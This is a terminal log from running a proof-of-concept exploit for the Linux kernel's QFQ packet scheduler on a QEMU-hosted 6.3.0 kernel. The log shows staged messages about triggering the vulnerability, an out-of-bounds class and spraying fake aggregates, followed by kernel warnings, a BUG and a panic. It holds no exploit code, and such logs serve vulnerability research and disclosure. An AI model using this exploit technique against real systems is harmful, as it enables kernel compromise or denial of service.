
```
$ ./poc
INFO: worker 17 is entering stage 1: trigger vulnerability
INFO: trying to prepare helper class ..
INFO: trying to prepare oob class ..
INFO: activating help[  596.961877] ------------[ cut here ]------------
er agg ..
[  596.974328] qfq_dequeue: non-workconserving leaf
[  596.991047] WARNING: CPU: 0 PID: 668 at net/sched/sch_qfq.c:991 qfq_dequeue+0x359/0x360
[  597.015340] Modules linked in:
[  597.031465] CPU: 0 PID: 668 Comm: poc Not tainted 6.3.0 #93
[  597.050839] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  597.074922] RIP: 0010:qfq_dequeue+0x359/0x360
[  597.085010] Code: 24 4c 89 73 50 49 89 44 24 58 49 89 74 24 60 4c 89 36 e9 dd fe ff ff 48 c7 c7 90 8c 32 83 c6 05 9f 74 e9 01 01 e8 a7 ec 11 ff <0f> 0b e9 d5 fd ff ff 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
[  597.128018] RSP: 0018:ffffc900012639a0 EFLAGS: 00010286
[  597.142111] RAX: 0000000000000000 RBX: ffff888109495f80 RCX: 0000000000000000
[  597.155691] RDX: 0000000000000403 RSI: ffffffff831f90a0 RDI: 00000000ffffffff
[  597.170630] RBP: ffff88810953c000 R08: 00000000ffffdfff R09: 0000000000000001
[  597.189821] R10: 00000000ffffdfff R11: ffffffff83c7afa0 R12: ffff888109495158
[  597.204535] R13: 0000000000000000 R14: ffff888109495fc8 R15: ffff88810953c000
[  597.222263] FS:  00000000008b4380(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[  597.236917] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  597.250119] CR2: 00000000008c9000 CR3: 0000000102a7a000 CR4: 0000000000050ef0
[  597.268805] Call Trace:
[  597.278082]  <TASK>
[  597.285649]  __qdisc_run+0x88/0x610
[  597.292751]  __dev_queue_xmit+0x64d/0xd90
[  597.303444]  ip_finish_output2+0x15a/0x560
[  597.313084]  ip_send_skb+0x82/0x90
[  597.321662]  udp_send_skb+0x153/0x350
[  597.328502]  udp_sendmsg+0xaa8/0xe50
[  597.336645]  ? __pfx_ip_generic_getfrag+0x10/0x10
[  597.345744]  ? sock_sendmsg+0x7d/0x90
[  597.351263]  sock_sendmsg+0x7d/0x90
[  597.355951]  __sys_sendto+0x11c/0x170
[  597.362284]  __x64_sys_sendto+0x20/0x30
[  597.368481]  do_syscall_64+0x64/0x90
[  597.375257]  ? exit_to_user_mode_prepare+0x1a/0x140
[  597.385384]  ? syscall_exit_to_user_mode+0x22/0x50
[  597.394121]  ? __x64_sys_setsockopt+0x1b/0x30
[  597.401388]  ? do_syscall_64+0x70/0x90
[  597.408060]  ? do_syscall_64+0x70/0x90
[  597.414720]  ? syscall_exit_to_user_mode+0x22/0x50
[  597.422719]  ? do_syscall_64+0x70/0x90
[  597.429785]  ? do_syscall_64+0x70/0x90
[  597.438373]  ? exit_to_user_mode_prepare+0x1a/0x140
[  597.449243]  entry_SYSCALL_64_after_hwframe+0x72/0xdc
[  597.459368] RIP: 0033:0x43ed67
[  597.467712] Code: ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 f3 0f 1e fa 80 3d fd 43 07 00 00 41 89 ca 74 10 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 71 c3 55 48 83 ec 30 44 89 4c 24 2c 4c 89 44
[  597.506064] RSP: 002b:0000787ab336fd78 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  597.519987] RAX: ffffffffffffffda RBX: 0000000000000011 RCX: 000000000043ed67
[  597.533866] RDX: 0000000000000001 RSI: 0000787ab336fdc0 RDI: 0000000000000005
[  597.547363] RBP: 0000000000000005 R08: 0000787ab336fdb0 R09: 0000000000000010
[  597.560975] R10: 0000000000000000 R11: 0000000000000202 R12: 00000000004b4520
[  597.575554] R13: 0000000000000004 R14: 0000000000000003 R15: 0000000000000001
[  597.589793]  </TASK>
[  597.595221] ---[ end trace 0000000000000000 ]---
INFO: spraying some fake qfq_aggregate ..
[  597.615863] ------------[ cut here ]------------
[  597.628011] kernel BUG at net/sched/sch_qfq.c:903!
[  597.659982] invalid opcode: 0000 [#1] PREEMPT SMP PTI
[  597.667275] CPU: 0 PID: 668 Comm: poc Tainted: G        W          6.3.0 #93
[  597.682742] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  597.713092] RIP: 0010:qfq_choose_next_agg+0x315/0x320
[  597.728642] Code: ff ff ff 48 8d 84 33 88 00 00 00 48 0f ba 30 00 e9 5d fe ff ff 31 c9 31 ff e9 a9 fd ff ff 48 89 73 28 45 31 e4 e9 69 ff ff ff <0f> 0b 90 0f 1f 84 00 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90
[  597.771983] RSP: 0018:ffffc900012639b0 EFLAGS: 00010246
[  597.782933] RAX: 0000000000000010 RBX: ffff88810953c180 RCX: 0000000000000000
[  597.798844] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff88810953c180
[  597.818206] RBP: 0000000000000000 R08: 0000000000000001 R09: 0000000000400000
[  597.850114] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[  597.872119] R13: 0000000000000000 R14: ffff888109495fc8 R15: ffff88810953c000
[  597.889104] FS:  00000000008b4380(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[  597.904957] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  597.915409] CR2: 00000000008c9000 CR3: 0000000102a7a000 CR4: 0000000000050ef0
[  597.930871] Call Trace:
[  597.935621]  <TASK>
[  597.939821]  qfq_dequeue+0x194/0x360
[  597.947904]  __qdisc_run+0x88/0x610
[  597.958074]  __dev_queue_xmit+0x64d/0xd90
[  597.968881]  ? __ip_select_ident+0x99/0xc0
[  597.975637]  ? __pfx_apparmor_ip_postroute+0x10/0x10
[  597.985446]  ? nf_hook_slow+0x41/0xc0
[  597.997751]  ip_finish_output2+0x28f/0x560
[  598.005745]  ip_send_skb+0x82/0x90
[  598.013372]  udp_send_skb+0x153/0x350
[  598.022531]  udp_sendmsg+0xaa8/0xe50
[  598.031896]  ? asm_sysvec_apic_timer_interrupt+0x16/0x20
[  598.043786]  ? __pfx_ip_generic_getfrag+0x10/0x10
[  598.060966]  ? sock_sendmsg+0x7d/0x90
[  598.066581]  sock_sendmsg+0x7d/0x90
[  598.071659]  __sys_sendto+0x11c/0x170
[  598.078852]  ? timerqueue_add+0x62/0xb0
[  598.086041]  __x64_sys_sendto+0x20/0x30
[  598.092974]  do_syscall_64+0x64/0x90
[  598.099767]  ? exit_to_user_mode_prepare+0x132/0x140
[  598.109631]  ? syscall_exit_to_user_mode+0x22/0x50
[  598.118225]  ? do_syscall_64+0x70/0x90
[  598.125042]  ? do_syscall_64+0x70/0x90
[  598.133672]  ? do_syscall_64+0x70/0x90
[  598.142096]  ? exit_to_user_mode_prepare+0x1a/0x140
[  598.153237]  entry_SYSCALL_64_after_hwframe+0x72/0xdc
[  598.164704] RIP: 0033:0x43ed67
[  598.169095] Code: ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 f3 0f 1e fa 80 3d fd 43 07 00 00 41 89 ca 74 10 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 71 c3 55 48 83 ec 30 44 89 4c 24 2c 4c 89 44
[  598.205505] RSP: 002b:0000787ab336fd78 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  598.217434] RAX: ffffffffffffffda RBX: 0000000000000011 RCX: 000000000043ed67
[  598.231860] RDX: 0000000000000200 RSI: 0000787ab336fdc0 RDI: 0000000000000005
[  598.248921] RBP: 0000000000000005 R08: 0000787ab336fdb0 R09: 0000000000000010
[  598.267022] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000001
[  598.279025] R13: 0000000000000004 R14: 0000000000000003 R15: 0000000000000001
[  598.295498]  </TASK>
[  598.297630] Modules linked in:
[  598.324844] ---[ end trace 0000000000000000 ]---
[  598.335571] RIP: 0010:qfq_choose_next_agg+0x315/0x320
[  598.348368] Code: ff ff ff 48 8d 84 33 88 00 00 00 48 0f ba 30 00 e9 5d fe ff ff 31 c9 31 ff e9 a9 fd ff ff 48 89 73 28 45 31 e4 e9 69 ff ff ff <0f> 0b 90 0f 1f 84 00 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90
[  598.405566] RSP: 0018:ffffc900012639b0 EFLAGS: 00010246
[  598.424619] RAX: 0000000000000010 RBX: ffff88810953c180 RCX: 0000000000000000
[  598.437447] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff88810953c180
[  598.450568] RBP: 0000000000000000 R08: 0000000000000001 R09: 0000000000400000
[  598.462673] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[  598.476248] R13: 0000000000000000 R14: ffff888109495fc8 R15: ffff88810953c000
[  598.490979] FS:  00000000008b4380(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[  598.506402] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  598.517726] CR2: 00000000008c9000 CR3: 0000000102a7a000 CR4: 0000000000050ef0
[  598.528791] Kernel panic - not syncing: Fatal exception in interrupt
```
